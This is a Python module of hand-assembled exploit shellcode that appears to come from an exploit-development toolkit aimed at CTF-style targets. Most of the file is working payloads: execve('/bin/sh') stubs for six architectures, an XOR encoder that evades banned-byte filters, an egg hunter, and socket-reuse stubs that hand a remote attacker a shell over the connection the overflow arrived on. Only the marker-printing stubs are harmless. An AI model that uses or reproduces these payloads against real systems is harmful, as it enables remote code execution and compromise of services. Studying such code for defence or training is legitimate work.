"""Minimal position-aware x86-64 shellcode (pure stdlib, hand-encoded).

Used by the mprotect+shellcode L3 chain: after a ROP chain makes a page RWX and jumps to it,
this shellcode runs there. `write_marker` prints a marker (so the exploit is verifiable by
observed output) then exits cleanly.
"""
from __future__ import annotations

import struct


def _p64(v):
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def _p32(v):
    return struct.pack("<I", v & 0xFFFFFFFF)


# fixed byte length of the code template below; the marker is appended right after it, so its
# address is code_addr + _CODE_LEN.
_CODE_LEN = 45


def execve_binsh() -> bytes:
    """execve("/bin/sh", NULL, NULL) -- a 25-byte x86-64 stub that spawns a shell when jumped to
    (an executable stack / RWX page + a `call/jmp` into the input buffer). Position-independent:
    it builds "/bin/sh" on the stack, so it runs anywhere."""
    return (
        b"\x48\x31\xf6"                                  # xor rsi, rsi      ; argv = NULL
        b"\x48\x31\xd2"                                  # xor rdx, rdx      ; envp = NULL
        b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"      # mov rbx, "/bin/sh\0"
        b"\x53"                                          # push rbx
        b"\x48\x89\xe7"                                  # mov rdi, rsp      ; rdi = "/bin/sh"
        b"\x6a\x3b"                                      # push 0x3b
        b"\x58"                                          # pop rax           ; rax = 59 (execve)
        b"\x0f\x05"                                      # syscall
    )


#: Base decoder stub lengths, before padding. Two decoders, because the one-byte key makes the
#: SMALLER stub and the four-byte key succeeds far more often: a single key byte has to clear every
#: banned byte for the whole payload at once, so the longer the payload the likelier all 256 keys
#: are ruled out -- measured, an 82-byte stub against a 5-byte banned set has NO single-byte key.
#: With a rolling 4-byte key each key byte only has to clear the payload bytes at its own position
#: mod 4, which is a quarter of the constraints and four independent searches.
#:
#: Three encoding choices here are each the result of a banned set defeating the obvious one:
#:
#: * the `jmp`/`call`/`pop` get-PC, not `lea rsi, [rip+N]`. RIP-relative addressing has only a
#:   disp32, so a FORWARD reference of a few dozen bytes writes three NUL bytes into the stub --
#:   and the decoder was being asked for exactly `{0x00, 0x0a}` ("a line reader stops at NUL /
#:   newline") at a call site that could therefore never succeed. A backward `call` is a small
#:   negative disp32, which is 0xff bytes and no NULs, and its pushed return address IS the
#:   payload's address.
#: * `dec dl; jnz`, not `loop`. `loop` needs the WHOLE of rcx zeroed first, and every short way to
#:   zero it (`xor ecx,ecx`, `sub ecx,ecx`) encodes the ModRM byte 0xc9 -- which HTB execute's
#:   banned set, the one real set this module was built against, bans. `dec dl` takes the zero flag
#:   off dl alone, so the register's upper bits never matter.
#: * PADDING. Even then the `jnz`'s own displacement came out as 0xf6, also banned by that set. The
#:   loop body therefore takes 0 to 3 filler bytes, which slides every displacement in the stub, and
#:   the encoder searches those variants alongside the keys. A stub with fixed bytes is only ever
#:   LUCKY with respect to a banned set; searching a small variant space is what makes it robust.
_STUB1 = 25
_STUB4 = 32
_PAD = b"\x90"                                           # nop


def _decoder1(enc_len: int, key: int, pad: int = 0) -> bytes:
    """One-byte XOR decoder. rsi walks the encoded bytes, rdi keeps the start, `jmp rdi` enters the
    decoded payload."""
    total = _STUB1 + pad
    stub = (b"\xeb" + bytes([total - 7])                 # jmp getpc
            + b"\x5e"                                    # L1: pop rsi   ; rsi = &payload
            + b"\x48\x89\xf7"                           # mov rdi, rsi
            + b"\xb2" + bytes([enc_len])                  # mov dl, len
            + b"\x80\x36" + bytes([key])                 # decode: xor byte [rsi], key
            + b"\x48\xff\xc6"                           # inc rsi
            + _PAD * pad                                  # (slides the displacements)
            + b"\xfe\xca"                                # dec dl
            + b"\x75" + bytes([(-(10 + pad)) & 0xFF])     # jnz decode
            + b"\xff\xe7"                                # jmp rdi
            + b"\xe8" + struct.pack("<i", 2 - total))     # getpc: call L1
    assert len(stub) == total, (len(stub), total)
    return stub


def _decoder4(enc_len: int, seq, pad: int = 0) -> bytes:
    """Four-byte ROLLING XOR decoder. `rol eax, 8` cycles the key through al, so the byte used at
    position i is `seq[i % 4]`.

    The immediate's byte order is not the key order: `mov eax, imm32` is little-endian, so al is
    imm32's low byte, and after each `rol eax, 8` al becomes the next byte DOWN from the top. The
    al sequence for instruction bytes (b0, b1, b2, b3) is therefore (b0, b3, b2, b1) -- so the
    immediate is emitted as seq[0], seq[3], seq[2], seq[1]."""
    s0, s1, s2, s3 = seq
    total = _STUB4 + pad
    stub = (b"\xeb" + bytes([total - 7])                 # jmp getpc
            + b"\x5e"                                    # L1: pop rsi
            + b"\x48\x89\xf7"                           # mov rdi, rsi
            + b"\xb2" + bytes([enc_len])                  # mov dl, len
            + b"\xb8" + bytes([s0, s3, s2, s1])           # mov eax, imm32 (the rolling key)
            + b"\x30\x06"                                # decode: xor byte [rsi], al
            + b"\xc1\xc0\x08"                           # rol eax, 8
            + b"\x48\xff\xc6"                           # inc rsi
            + _PAD * pad
            + b"\xfe\xca"                                # dec dl
            + b"\x75" + bytes([(-(12 + pad)) & 0xFF])     # jnz decode
            + b"\xff\xe7"                                # jmp rdi
            + b"\xe8" + struct.pack("<i", 2 - total))     # getpc: call L1
    assert len(stub) == total, (len(stub), total)
    return stub


def encode_avoiding(payload: bytes, bad: bytes, *, pads=(0, 1, 2, 3)):
    """Wrap `payload` in a position-independent XOR decoder so the WHOLE thing avoids every byte in
    `bad`, for a target that filters the input before running it (bad-char constraint, e.g. HTB
    execute bans 0x3b/0xc0/"/bin/sh"). Returns the self-decoding shellcode, or None when nothing in
    the (key x padding) space works.

    A one-byte key is tried first because its stub is the smaller one; a four-byte rolling key is
    the fallback, and it is what makes the longer stubs in this module (`egg_hunter` at 48 bytes,
    `find_socket_execve_binsh` at 82) encodable at all.

    The payload sits in the same executable+writable buffer (execstack / RWX), so the in-place
    decode is legal. The length goes in `dl` rather than through `push N; pop rcx`: `push imm8`
    SIGN-EXTENDS, so a payload of 128 bytes or more set rcx to ~2^64 and the decode loop ran over
    the whole address space."""
    badset = set(bad)
    if not payload or len(payload) > 255:
        return None                                      # mov dl, N
    for key in range(1, 256):                            # one byte: the smaller stub
        if key in badset:
            continue
        enc = bytes(b ^ key for b in payload)
        if badset & set(enc):
            continue
        for pad in pads:
            blob = _decoder1(len(enc), key, pad) + enc
            if not (badset & set(blob)):
                return blob
    # Four-byte rolling key. Each position class is independent, so the four searches are
    # separate -- which is the whole gain over the single key.
    seq = []
    for j in range(4):
        col = payload[j::4]
        k = next((c for c in range(1, 256)
                  if c not in badset and not (badset & {b ^ c for b in col})), None)
        if k is None:
            return None
        seq.append(k)
    enc = bytes(b ^ seq[i % 4] for i, b in enumerate(payload))
    for pad in pads:
        blob = _decoder4(len(enc), seq, pad) + enc
        if not (badset & set(blob)):
            return blob
    return None


def write_marker(marker: bytes, code_addr: int) -> bytes:
    """write(1, marker, len(marker)); exit(0). `code_addr` is where the shellcode is loaded,
    so it can point rsi at the marker bytes appended after the code."""
    code = (
        b"\x48\xc7\xc0\x01\x00\x00\x00"                 # mov rax, 1 (SYS_write)
        b"\x48\xc7\xc7\x01\x00\x00\x00"                 # mov rdi, 1 (stdout)
        + b"\x48\xbe" + _p64(code_addr + _CODE_LEN)     # mov rsi, &marker
        + b"\x48\xc7\xc2" + _p32(len(marker))           # mov rdx, len(marker)
        + b"\x0f\x05"                                   # syscall
        + b"\x48\xc7\xc0\x3c\x00\x00\x00"               # mov rax, 60 (SYS_exit)
        + b"\x48\x31\xff"                               # xor rdi, rdi
        + b"\x0f\x05"                                   # syscall
    )
    assert len(code) == _CODE_LEN, len(code)
    return code + marker


def execve_binsh_aarch64() -> bytes:
    """AArch64 execve("/bin/sh", NULL, NULL) -- 40 bytes, position-independent (builds "/bin/sh\\0"
    on the stack via movz/movk and points x0 at it). Under qemu-user this spawns a REAL shell: qemu
    relays the execve to the host, and /bin/sh is a host binary the kernel then runs natively -- so
    a cross-arch ret2shellcode can be confirmed by an interactive shell, not only a written marker.
    Encodings assembled against aarch64-linux-gnu-as and run under qemu-aarch64."""
    return bytes.fromhex(
        "010080d2"   # mov  x1, #0                 ; argv = NULL
        "020080d2"   # mov  x2, #0                 ; envp = NULL
        "e3458cd2"   # movz x3, #0x622f            ; "/b"
        "23cdadf2"   # movk x3, #0x6e69, lsl #16   ; "in"
        "e365cef2"   # movk x3, #0x732f, lsl #32   ; "/s"
        "030de0f2"   # movk x3, #0x0068, lsl #48   ; "h\0"
        "e30f1ff8"   # str  x3, [sp, #-16]!        ; push "/bin/sh"
        "e0030091"   # mov  x0, sp                 ; x0 = &"/bin/sh"
        "a81b80d2"   # mov  x8, #221               ; __NR_execve
        "0100 00d4".replace(" ", ""))              # svc  #0


def execve_binsh_arm() -> bytes:
    """ARM (32-bit, ARM mode) execve("/bin/sh", NULL, NULL) -- 28 bytes, position-independent
    (`add r0, pc, #12` points r0 at the "/bin/sh\\0" appended after the code). Like aarch64, under
    qemu-arm this spawns a REAL shell (the guest execve is relayed to the host). Assembled against
    arm-linux-gnueabihf-as and run under qemu-arm."""
    return bytes.fromhex(
        "0c008fe2"   # add r0, pc, #12   ; r0 -> "/bin/sh"
        "0010a0e3"   # mov r1, #0        ; argv = NULL
        "0020a0e3"   # mov r2, #0        ; envp = NULL
        "0b70a0e3"   # mov r7, #11       ; __NR_execve
        "000000ef"   # svc #0
    ) + b"/bin/sh\x00"


def write_marker_arm(marker: bytes) -> bytes:
    """ARM (32-bit) write(1, marker, len); exit(0). Position-independent (`add r1, pc, #20` points
    r1 at the marker after the fixed 8-instruction/32-byte code); the length immediate is patched.
    Confirms a cross-arch exploit by a WRITTEN marker when a shell does not come up. Assembled
    against arm-linux-gnueabihf-as and run under qemu-arm."""
    n = len(marker) & 0xFF
    return struct.pack(
        "<8I",
        0xE3A00001,                      # mov r0, #1        ; fd = stdout
        0xE28F1014,                      # add r1, pc, #20   ; r1 -> marker
        0xE3A02000 | n,                  # mov r2, #len
        0xE3A07004,                      # mov r7, #4        ; __NR_write
        0xEF000000,                      # svc #0
        0xE3A00000,                      # mov r0, #0
        0xE3A07001,                      # mov r7, #1        ; __NR_exit
        0xEF000000,                      # svc #0
    ) + marker


def execve_binsh_riscv64() -> bytes:
    """RISC-V 64 execve("/bin/sh", NULL, NULL) -- 32 bytes, position-independent (`auipc a0,0` +
    `addi a0,a0,24` points a0 at the "/bin/sh\\0" appended after the 24-byte code). Under qemu-user
    this spawns a REAL shell (the guest execve is relayed to the host). All 4-byte, no compressed
    insns, so the +24 offset is exact; assembled against riscv64-linux-gnu-as (-march=rv64g) and run
    under qemu-riscv64."""
    return struct.pack(
        "<6I",
        0x00000517,                      # auipc a0, 0          ; a0 = PC here
        0x01850513,                      # addi  a0, a0, 24     ; a0 -> "/bin/sh"
        0x00000593,                      # addi  a1, zero, 0    ; argv = NULL
        0x00000613,                      # addi  a2, zero, 0    ; envp = NULL
        0x0DD00893,                      # addi  a7, zero, 221  ; __NR_execve
        0x00000073,                      # ecall
    ) + b"/bin/sh\x00"


def write_marker_riscv64(marker: bytes) -> bytes:
    """RISC-V 64 write(1, marker, len); exit(0). Position-independent (`auipc a1,0` + `addi a1,a1,36`
    points a1 at the marker after the fixed 9-instruction/36-byte code); the length immediate is
    patched into `addi a2,zero,len`. Confirms a cross-arch ret2shellcode by a WRITTEN marker when a
    shell does not come up. Encodings assembled against riscv64-linux-gnu-as + run under qemu."""
    n = len(marker) & 0xFFF
    return struct.pack(
        "<9I",
        0x00000597,                      # auipc a1, 0
        0x02458593,                      # addi  a1, a1, 36     ; a1 -> marker
        0x00100513,                      # addi  a0, zero, 1    ; fd = stdout
        0x00000613 | (n << 20),          # addi  a2, zero, len
        0x04000893,                      # addi  a7, zero, 64   ; __NR_write
        0x00000073,                      # ecall
        0x00000513,                      # addi  a0, zero, 0
        0x05D00893,                      # addi  a7, zero, 93   ; __NR_exit
        0x00000073,                      # ecall
    ) + marker


def execve_binsh_ppc64le() -> bytes:
    """PowerPC64 (ELFv2, little-endian) execve("/bin/sh", NULL, NULL) -- 36 bytes, position-independent
    (`bl .+4` + `mflr r3` + `addi r3,r3,24` points r3 at the "/bin/sh\\0" appended after the 28-byte
    code). r0=11 (__NR_execve), r4=r5=0, `sc`. Under qemu-user this spawns a REAL shell (the guest
    execve is relayed to the host). Verified by running the bytes as injected code (an RWX buffer
    called through a pointer) under qemu-ppc64le -- a standalone _start exe misloads as ELFv1."""
    return struct.pack(
        "<7I",
        0x48000005,                      # bl .+4               ; LR = &mflr
        0x7C6802A6,                      # mflr r3              ; r3 = &mflr
        0x38630018,                      # addi r3, r3, 24      ; r3 -> "/bin/sh"
        0x38800000,                      # li   r4, 0           ; argv = NULL
        0x38A00000,                      # li   r5, 0           ; envp = NULL
        0x3800000B,                      # li   r0, 11          ; __NR_execve
        0x44000002,                      # sc
    ) + b"/bin/sh\x00"


def write_marker_ppc64le(marker: bytes) -> bytes:
    """PowerPC64 (ELFv2, little-endian) write(1, marker, len); exit. Position-independent (`bl .+4` +
    `mflr r4` + `addi r4,r4,32` points r4 at the marker after the 36-byte code); the length immediate
    is patched into `li r5,len`. Verified as injected code under qemu-ppc64le."""
    n = len(marker) & 0xFFFF
    return struct.pack(
        "<9I",
        0x48000005,                      # bl .+4
        0x7C8802A6,                      # mflr r4
        0x38840020,                      # addi r4, r4, 32      ; r4 -> marker
        0x38600001,                      # li   r3, 1           ; fd = stdout
        0x38A00000 | n,                  # li   r5, len
        0x38000004,                      # li   r0, 4           ; __NR_write
        0x44000002,                      # sc
        0x38000001,                      # li   r0, 1           ; __NR_exit
        0x44000002,                      # sc
    ) + marker


def execve_binsh_s390x() -> bytes:
    """s390x (IBM Z, big-endian) execve("/bin/sh", NULL, NULL) -- 24 bytes, position-independent
    (`larl r2,binsh` addresses the "/bin/sh\\0" appended after the 16-byte code, PC-relative). r3=r4=0
    (xgr), `svc 11` (__NR_execve). s390 instruction bytes are written in order (not byte-swapped),
    so these bytes are the same on the big-endian target. Verified by running the bytes as injected
    code under qemu-s390x."""
    return bytes.fromhex(
        "c02000000008"                   # larl r2, binsh       ; r2 -> "/bin/sh" (+16 bytes)
        "b9820033"                       # xgr  r3, r3          ; argv = NULL
        "b9820044"                       # xgr  r4, r4          ; envp = NULL
        "0a0b"                           # svc  11              ; __NR_execve
    ) + b"/bin/sh\x00"


def write_marker_s390x(marker: bytes) -> bytes:
    """s390x write(1, marker, len); exit. Position-independent (`larl r3,msg` addresses the marker
    after the 22-byte code); the length immediate is patched into `lghi r4,len`. Verified as injected
    code under qemu-s390x."""
    n = len(marker) & 0xFFFF
    return (
        bytes.fromhex("c0300000000b")    # larl r3, msg          ; r3 -> marker (+22 bytes)
        + bytes.fromhex("a7290001")      # lghi r2, 1            ; fd = stdout
        + b"\xa7\x49" + n.to_bytes(2, "big")   # lghi r4, len
        + bytes.fromhex("0a04")          # svc 4                ; __NR_write
        + bytes.fromhex("a7290000")      # lghi r2, 0
        + bytes.fromhex("0a01")          # svc 1                ; __NR_exit
    ) + marker


def execve_binsh_ppc32() -> bytes:
    """PowerPC 32-bit (ELF32, big-endian) execve("/bin/sh", NULL, NULL). Same PowerPC instruction
    words as the ppc64le stub (the base ISA is identical), but packed BIG-ENDIAN for the ppc32 image.
    Position-independent (`bl .+4`/`mflr r3`/`addi r3,r3,24`); r0=11, `sc`. Verified as injected code
    under qemu-ppc."""
    return struct.pack(
        ">7I",
        0x48000005,                      # bl .+4
        0x7C6802A6,                      # mflr r3
        0x38630018,                      # addi r3, r3, 24      ; r3 -> "/bin/sh"
        0x38800000,                      # li   r4, 0
        0x38A00000,                      # li   r5, 0
        0x3800000B,                      # li   r0, 11          ; __NR_execve
        0x44000002,                      # sc
    ) + b"/bin/sh\x00"


def write_marker_ppc32(marker: bytes) -> bytes:
    """PowerPC 32-bit (big-endian) write(1, marker, len); exit -- the ppc64le write-marker words,
    packed big-endian. Verified as injected code under qemu-ppc."""
    n = len(marker) & 0xFFFF
    return struct.pack(
        ">9I",
        0x48000005,                      # bl .+4
        0x7C8802A6,                      # mflr r4
        0x38840020,                      # addi r4, r4, 32      ; r4 -> marker
        0x38600001,                      # li   r3, 1           ; fd = stdout
        0x38A00000 | n,                  # li   r5, len
        0x38000004,                      # li   r0, 4           ; __NR_write
        0x44000002,                      # sc
        0x38000001,                      # li   r0, 1           ; __NR_exit
        0x44000002,                      # sc
    ) + marker


def write_marker_aarch64(marker: bytes) -> bytes:
    """AArch64 write(1, marker, len); exit(93). Position-independent: `adr x1, marker` addresses the
    marker bytes appended after the fixed 7-instruction (28-byte) code, PC-relative, so the stub
    runs anywhere it is jumped to. Confirming a cross-arch ret2shellcode by a WRITTEN marker (not a
    spawned shell) is what makes it verifiable under qemu-user, where execve('/bin/sh') is
    unreliable. Encodings assembled and checked against `aarch64-linux-gnu-as` + qemu."""
    n = len(marker) & 0xFFFF
    return struct.pack(
        "<7I",
        0xD2800020,                      # mov x0, #1            ; fd = stdout
        0x100000C1,                      # adr x1, marker        ; +24 bytes -> the appended marker
        0xD2800002 | (n << 5),           # movz x2, #len
        0xD2800808,                      # mov x8, #64           ; __NR_write
        0xD4000001,                      # svc #0
        0xD2800BA8,                      # mov x8, #93           ; __NR_exit
        0xD4000001,                      # svc #0
    ) + marker


# --------------------------------------------------------------- the buffer is too small: egg hunt
#: The tag is searched for TWICE in a row, which is what keeps the hunter from finding the copy of
#: the tag inside its own instruction stream: `mov eax, TAG` embeds it once, never twice.
EGG_TAG = b"W00T"
_EGG_LEN = 48


def egg_hunter(tag: bytes = EGG_TAG) -> bytes:
    """A 48-byte x86-64 egg hunter: walk memory forward from the hunter's own address until a
    doubled `tag` is found, then jump to the byte after it.

    The answer to a target whose EXECUTABLE buffer is too small for a payload but which has a
    larger buffer somewhere else -- an environment variable, an argv string, a heap copy of a file
    -- that the same process holds. The hunter goes in the small one, `egg()` in the large one, and
    no address has to be known.

    Two details that are the difference between working and not, both measured:

    * the walk starts at `lea rdx, [rip]`, not at 0. A hunter that starts from the bottom of the
      address space makes one `access()` syscall per page across 47 bits of address space and never
      arrives; the payload came in on the same input, so it is nearly always ABOVE the hunter.
    * the page probe is `access(rdx + 8, 0)`, not `access(rdx, 0)`. The comparison reads EIGHT
      bytes (`scasd` twice), so a window whose first byte is on a mapped page and whose last is not
      faults even though the probe passed -- seen as a SIGSEGV at exactly the distance where the
      scan crossed into unmapped memory. Probing the window's END covers both pages in one
      syscall, because the walk only ever enters pages it has already validated.

    `access` is the probe rather than a signal handler because its -EFAULT return (low byte 0xf2)
    reports an unmapped page WITHOUT taking a signal, so the hunter needs no SIGSEGV handler and
    leaves the process's own handlers alone. Assembled against `as --64`; measured finding a
    payload 0x100, 0x4000 and 0x100000 bytes away, and declining when the tag is broken."""
    if len(tag) != 4:
        raise ValueError("the egg tag is 4 bytes (it is compared with scasd, twice)")
    code = (
        b"\x48\x8d\x15\x00\x00\x00\x00"   #            lea rdx, [rip]      ; start at ourselves
        b"\x48\xff\xc2"                   # next_addr: inc rdx
        b"\x48\x8d\x7a\x08"               #            lea rdi, [rdx+8]    ; probe the window END
        b"\x6a\x15"                       #            push 21
        b"\x58"                           #            pop rax             ; __NR_access
        b"\x31\xf6"                       #            xor esi, esi        ; mode = 0
        b"\x0f\x05"                       #            syscall
        b"\x3c\xf2"                       #            cmp al, 0xf2        ; -EFAULT?
        b"\x74\x10"                       #            je next_page
        b"\xb8" + bytes(tag) +            #            mov eax, tag
        b"\x48\x89\xd7"                   #            mov rdi, rdx
        b"\xaf"                           #            scasd
        b"\x75\xe3"                       #            jne next_addr
        b"\xaf"                           #            scasd               ; the tag TWICE
        b"\x75\xe0"                       #            jne next_addr
        b"\xff\xe7"                       #            jmp rdi
        b"\x66\x81\xca\xff\x0f"           # next_page: or dx, 0xfff
        b"\xeb\xd7"                       #            jmp next_addr
    )
    assert len(code) == _EGG_LEN, len(code)
    return code


def egg(payload: bytes, tag: bytes = EGG_TAG) -> bytes:
    """`payload` with the doubled tag in front, for delivery on whatever channel has ROOM. What
    `egg_hunter` jumps to is the first byte after the eight tag bytes."""
    if len(tag) != 4:
        raise ValueError("the egg tag is 4 bytes")
    return bytes(tag) * 2 + bytes(payload)


# ------------------------------------------------- the shell has to come back the way it came in
def find_socket_execve_binsh(max_fd: int = 0x100) -> bytes:
    """An 82-byte x86-64 stub that finds the CONNECTED socket among the low file descriptors,
    dup2's it onto stdin/stdout/stderr and execve's a shell -- so an overflow delivered over a
    network talks back over the connection it arrived on.

    `execve_binsh` alone is useless on a network target: the shell it spawns inherits the service's
    own stdio, which goes to a log or /dev/null, and nothing reaches the attacker. The usual
    alternative is a reverse shell, which needs outbound egress and a second channel to verify.
    This needs neither.

    `getpeername(fd)` returning 0 is the test, and it is the right one: it succeeds only on a
    socket that HAS a peer, so a LISTENING socket fails it (ENOTCONN) and so does every regular
    file, pipe and tty (ENOTSOCK) -- measured walking 0, 1, 2 (ENOTSOCK), 3 (EBADF, the listening
    socket the child closed) and finding 4. It gives up at `max_fd` and exits quietly rather than
    looping, because a stub that runs wild in a service is worse than one that does nothing."""
    if not 0 < max_fd <= 0x10000:
        raise ValueError("max_fd out of range")
    return (
        b"\x31\xff"                       #            xor edi, edi        ; fd = 0
        b"\x48\x8d\x74\x24\x80"           # next_fd:   lea rsi, [rsp-0x80] ; sockaddr_storage
        b"\x48\x8d\x94\x24\x78\xff\xff\xff"  #         lea rdx, [rsp-0x88] ; socklen_t*
        b"\xc7\x02\x80\x00\x00\x00"       #            mov dword [rdx], 0x80
        b"\x6a\x34"                       #            push 52
        b"\x58"                           #            pop rax             ; __NR_getpeername
        b"\x0f\x05"                       #            syscall
        b"\x85\xc0"                       #            test eax, eax
        b"\x74\x0f"                       #            je found
        b"\xff\xc7"                       #            inc edi
        b"\x81\xff" + _p32(max_fd) +      #            cmp edi, max_fd
        b"\x75\xda"                       #            jne next_fd
        b"\x6a\x3c"                       #            push 60
        b"\x58"                           #            pop rax             ; __NR_exit
        b"\x0f\x05"                       #            syscall
        b"\x31\xf6"                       # found:     xor esi, esi        ; newfd = 0,1,2
        b"\x6a\x21"                       # dup_loop:  push 33
        b"\x58"                           #            pop rax             ; __NR_dup2
        b"\x0f\x05"                       #            syscall
        b"\xff\xc6"                       #            inc esi
        b"\x83\xfe\x03"                   #            cmp esi, 3
        b"\x75\xf4"                       #            jne dup_loop
        b"\x31\xf6"                       #            xor esi, esi        ; argv = NULL
        b"\x31\xd2"                       #            xor edx, edx        ; envp = NULL
        b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"   # movabs rbx, "/bin/sh\0"
        b"\x53"                           #            push rbx
        b"\x48\x89\xe7"                   #            mov rdi, rsp
        b"\x6a\x3b"                       #            push 59
        b"\x58"                           #            pop rax             ; __NR_execve
        b"\x0f\x05"                       #            syscall
    )


def dup2_execve_binsh(fd: int) -> bytes:
    """The same thing for a fd that is already KNOWN -- 40 bytes instead of 82, which is what
    matters when the executable buffer is the constraint. `fd` must fit in an imm8 (`push`), which
    every realistic service fd does."""
    if not 0 <= fd <= 0x7F:
        raise ValueError("fd must fit a push imm8; use find_socket_execve_binsh instead")
    return (
        b"\x6a" + bytes([fd]) +           #            push fd
        b"\x5f"                           #            pop rdi
        b"\x31\xf6"                       #            xor esi, esi
        b"\x6a\x21"                       # dup_loop:  push 33
        b"\x58"                           #            pop rax             ; __NR_dup2
        b"\x0f\x05"                       #            syscall
        b"\xff\xc6"                       #            inc esi
        b"\x83\xfe\x03"                   #            cmp esi, 3
        b"\x75\xf4"                       #            jne dup_loop
        b"\x31\xf6"                       #            xor esi, esi
        b"\x31\xd2"                       #            xor edx, edx
        b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"   # movabs rbx, "/bin/sh\0"
        b"\x53"                           #            push rbx
        b"\x48\x89\xe7"                   #            mov rdi, rsp
        b"\x6a\x3b"                       #            push 59
        b"\x58"                           #            pop rax             ; __NR_execve
        b"\x0f\x05"                       #            syscall
    )
